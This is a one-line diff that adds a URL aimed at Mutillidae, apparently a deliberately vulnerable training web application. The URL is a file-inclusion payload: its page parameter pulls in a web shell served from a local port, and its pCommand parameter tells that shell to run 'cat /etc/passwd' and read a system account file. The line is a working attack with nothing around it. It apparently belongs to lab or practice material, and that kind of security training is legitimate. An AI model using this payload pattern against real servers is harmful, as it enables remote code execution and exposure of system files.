@@ -1,0 +1,1 @@
+http://mutillidae.local/index.php?page=http://127.0.0.1:8888/simple-web-shell.php&pCommand=cat+/etc/passwd
